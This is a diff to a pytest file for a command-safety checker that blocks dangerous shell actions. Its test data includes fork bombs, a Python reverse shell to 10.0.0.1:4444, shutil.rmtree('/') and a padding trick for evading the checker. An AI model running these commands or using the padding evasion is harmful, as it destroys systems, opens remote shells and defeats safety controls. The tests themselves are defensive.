@@ -360,7 +360,20 @@ def test_shell_syntax_benign_forms_stay_pass(command):
     assert _cmd(command).verdict is Verdict.PASS
 
 
-@pytest.mark.parametrize("command", [":(){ :|:& };:", ":(){ :|: & };:"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        ":(){ :|:& };:",
+        ":(){ :|: & };:",
+        # N2: pipe-less spellings -- a function named `:` that calls itself
+        # twice, once backgrounded, with `&`/`;` instead of `|` joining the
+        # body to the recursive call. Regressed to PASS when M1 removed the
+        # whole-command substring check and _FORK_BOMB_RE required a literal
+        # `|`; restored by widening the join class to `[|&;]`.
+        ":(){ :;: & };:",
+        ":(){ : & : & };:",
+    ],
+)
 def test_fork_bomb_still_blocked_after_paren_split(command):
     result = _cmd(command)
     assert result.verdict is Verdict.BLOCK
@@ -375,6 +388,21 @@ def test_quoted_fork_bomb_looking_substring_stays_pass():
     # only check that should gate the raw-command BLOCK.
     result = _cmd('echo "a: () {b}"')
     assert result.verdict is Verdict.PASS
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # N2: widening the join class to [|&;] must not start matching a `:`
+        # / `()` / `{}` shape that merely resembles a fork bomb in unrelated
+        # syntax (grep pattern, echoed string, dict/set literal).
+        "grep -r ':(){' .",
+        "echo ':(){'",
+        "python -c \"x = {':': (), '{': 1}\"",
+    ],
+)
+def test_fork_bomb_lookalikes_stay_pass(command):
+    assert _cmd(command).verdict is Verdict.PASS
 
 
 def test_substitution_argument_keeps_its_verdict():
@@ -1323,6 +1351,49 @@ def test_keyword_argument_literal_fix_does_not_weaken_real_join():
     assert ReasonCode.destructive_command in result.reason_codes
 
 
+# N1 -- the fragmentation cap (_MAX_SPAWN_LITERAL_WORK_CANDIDATES) must be a
+# FLOOR, never a short-circuit: appending inert, attacker-controlled filler
+# (a long list literal) to a payload that would otherwise BLOCK must not
+# demote it. `_N1_PAD` is the review's reproducer shape: `;y=[1,x,x,...,x]`
+# with 200 filler items, which re.split()s into > 128 candidates on its own.
+_N1_PAD = ";y=[1," + ",".join(["x"] * 200) + "]"
+
+
+@pytest.mark.parametrize(
+    "base, expected_verdict, expected_reason",
+    [
+        (
+            "import socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444));"
+            "subprocess.call(['/bin/sh'],stdin=s.fileno())",
+            Verdict.BLOCK,
+            ReasonCode.raw_socket_channel,
+        ),
+        (
+            "import shutil; shutil.rmtree('/')",
+            Verdict.BLOCK,
+            ReasonCode.destructive_command,
+        ),
+        (
+            "open('.doberman/policies.yaml','w').write('x')",
+            Verdict.BLOCK,
+            ReasonCode.protected_path_blocked,
+        ),
+    ],
+)
+def test_fragmentation_cap_never_demotes_a_stronger_verdict(
+    base, expected_verdict, expected_reason
+):
+    plain = _cmd(f'python -c "{base}"')
+    assert plain.verdict is expected_verdict
+    assert expected_reason in plain.reason_codes
+
+    padded = _cmd(f'python -c "{base}{_N1_PAD}"')
+    assert padded.verdict is plain.verdict, (
+        f"padding lowered the verdict: {plain.verdict} (plain) -> {padded.verdict} (padded)"
+    )
+    assert padded.reason_codes == plain.reason_codes
+
+
 # --- I6 + M4: bound the WORK of _spawn_literal_candidates, not just its -----
 # output. The `for group in stack: group.append(literal)` join runs once per
 # open group per literal — with no depth cap, `("x"(` repeated thousands of
@@ -1331,7 +1402,14 @@ def test_keyword_argument_literal_fix_does_not_weaken_real_join():
 # module's own posture is explicitly bounded ("Exhaustion is ambiguity,
 # never silent success"); this rule runs synchronously on every shell action.
 def test_spawn_literal_candidates_adversarial_payload_is_bounded():
-    payload = "subprocess.run" + '("x"(' * 4000
+    # N3(a): single-quoted `'x'` (not `"x"`) so shlex keeps the WHOLE payload
+    # intact as the `-c` argument -- the previous double-quoted-inside-a-
+    # double-quoted-shell-argument shape got collapsed by shlex before this
+    # rule ever saw it (12,014 of 20,026 chars survived), so the guard test
+    # measured a payload that was never the real attack shape (0.033s) and
+    # passed for the wrong reason. This realistic payload keeps 20,014 of
+    # 20,026 chars and is the one that actually drove the ~2s stall (N3).
+    payload = "subprocess.run" + "('x'(" * 4000
     command = f'python -c "{payload}"'
     start = time.perf_counter()
     result = _cmd(command)
